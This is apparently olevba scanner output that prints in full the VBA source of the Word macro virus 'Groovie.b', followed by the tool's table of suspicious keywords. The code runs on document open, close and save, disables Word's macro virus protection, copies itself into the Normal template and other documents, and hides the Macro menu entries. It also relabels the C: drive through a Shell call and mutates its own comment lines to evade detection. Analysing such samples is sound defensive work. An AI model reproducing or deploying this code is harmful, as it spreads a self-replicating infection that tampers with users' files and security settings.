olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-3b8fb7b75e9d8737ce08399f1d885cf19901ba15
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-3b8fb7b75e9d8737ce08399f1d885cf19901ba15 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-3b8fb7b75e9d8737ce08399f1d885cf19901ba15 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Public I02 As Boolean
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Public I03 As Boolean
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Public I04 As Boolean
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Public I05 As Boolean
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Public I06 As String
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Public I07 As Boolean
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Public I08 As Boolean
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I09()
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If MacroContainer = NormalTemplate Then
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        I01 = "normal"
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        GoTo checkout
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    End If
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
checkout:
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I10()
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    Next i
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    Next i
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I11()
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I09
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I10
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I01 = "document" Then Call I12
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I01 = "normal" Then Call I13
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I01 = "orbit" Then Call I14
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I12()
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I03 = False And I05 = False Then
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        With NormalTemplate.VBProject
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        With .VBComponents.Import("c:\groovie.sys")
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        End With
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        End With
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    End If
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I02 = False Then
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        If I08 = False Then Documents.Open FileName:=I06
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        Shell ("label c: groovie"), 0
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        Windows(1).Close
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    End If
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I13()
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Application.ScreenUpdating = False
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    Call I17
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I04 = False And I07 = True Then
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        With ActiveDocument.VBProject
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        With .VBComponents.Import("c:\groovie.sys")
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        End With
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        End With
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        With Dialogs(wdDialogFileSummaryInfo)
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            .Comments = "ALT-F11 says it's groovie!"
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            .Execute
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        End With
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    End If
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I02 = False And I07 = True Then
 ' CR7/7/99 10:34:17 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        If I08 = False Then Documents.Open FileName:=I06
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    End If
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If I02 = False And I07 = False Then
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        Documents.Add Template:="", NewTemplate:=False
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    End If
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Application.ScreenUpdating = True
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I14()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Application.ScreenUpdating = False
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        If I03 = False And I05 = False Then
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            With NormalTemplate.VBProject
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            With .VBComponents.Import("c:\groovie.sys")
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            End With
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            End With
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            NormalTemplate.Save
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        End If
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        If I04 = False Then
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            With ActiveDocument.VBProject
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            With .VBComponents.Import("c:\groovie.sys")
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            End With
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            End With
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            With Dialogs(wdDialogFileSummaryInfo)
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
                .Comments = "ALT-F11 says it's groovie!"
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
                .Execute
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
            End With
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        End If
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Application.ScreenUpdating = True
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I15()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    Options.VirusProtection = False
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    Options.SaveNormalPrompt = False
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    Options.ConfirmConversions = False
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    I06 = ActiveDocument.FullName
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    Call I11
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub AutoOpen()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I15
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub AutoClose()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
I08 = True
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I15
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub AutoExit()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I15
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub FileSaveAs()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I16
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I15
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Dialogs(wdDialogFileSaveAs).Show
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub filesave()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I16
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I15
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub fileclose()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
I08 = True
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I15
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
ActiveDocument.Close
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub fileprint()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error Resume Next
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Call I15
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Dialogs(wdDialogFilePrint).Show
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub ViewVBCode()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Sub FileTemplates()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Sub
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I17()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
On Error GoTo docek
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    If ActiveDocument.Name <> "" Then
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
        I07 = True
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    End If
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    GoTo over
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
docek:
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
    I07 = False
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
over:
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Function I16()
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Randomize
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
rn = Int(Rnd * 999)
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
For x = 2 To 358 Step 2
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
.deletelines x
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & rn & Application.ActivePrinter
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
Next x
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End With
 ' CR7/7/99 10:34:18 PM315Costin Raiu315Xerox 4900 PostScript on FILE:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

